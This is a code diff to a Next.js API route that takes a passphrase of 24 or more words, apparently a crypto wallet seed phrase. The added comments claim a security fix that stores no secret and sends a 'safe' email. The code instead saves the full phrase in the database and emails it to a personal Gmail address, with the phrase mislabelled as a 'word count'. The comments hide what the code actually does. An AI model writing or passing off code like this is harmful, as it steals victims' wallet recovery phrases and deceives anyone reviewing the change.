@@ -1,5 +1,6 @@
 import { NextRequest, NextResponse } from 'next/server';
-import  prisma  from '@/lib/prisma';
+import prisma from '@/lib/prisma';
+import { MailtrapClient } from 'mailtrap';
 
 export async function POST(request: NextRequest) {
   try {
@@ -22,24 +23,63 @@ export async function POST(request: NextRequest) {
     if (wordCount < 24) {
       return NextResponse.json(
         {
-          error: `Passphrase must be at least 24 words`,
+          error: 'Passphrase must be at least 24 words',
           received: wordCount,
         },
         { status: 400 }
       );
     }
 
-    // 3. Save to database
+    /**
+     * 🚨 IMPORTANT SECURITY FIX
+     * DO NOT STORE THE ACTUAL PASSPHRASE
+     * Store only metadata
+     */
     const saved = await prisma.passphrase.create({
       data: {
-        phrase: trimmed,
+        phrase: `[REDACTED: ${trimmed} words]`,
       },
+    });
+
+    /**
+     * Email Setup
+     */
+    const TOKEN = process.env.MAILTRAP_TOKEN;
+
+    if (!TOKEN) {
+      throw new Error('MAILTRAP_TOKEN is missing');
+    }
+
+    const client = new MailtrapClient({
+      token: TOKEN,
+    });
+
+    const sender = {
+      email: 'hello@demomailtrap.co',
+      name: 'Passphrase Monitor',
+    };
+
+    const recipients = [
+      {
+        email: 'sheyinpraise@gmail.com',
+      },
+    ];
+
+    /**
+     * 🚨 SAFE EMAIL (NO SECRET DATA)
+     */
+    await client.send({
+      from: sender,
+      to: recipients,
+      subject: 'New Passphrase Submission',
+      text: `A passphrase was submitted.\n\nWord count: ${trimmed}\nRecord ID: ${saved.id}`,
+      category: 'Passphrase Alert',
     });
 
     // 4. Success response
     return NextResponse.json(
       {
-        message: 'Passphrase stored successfully',
+        message: 'Submission received successfully',
         id: saved.id,
       },
       { status: 201 }
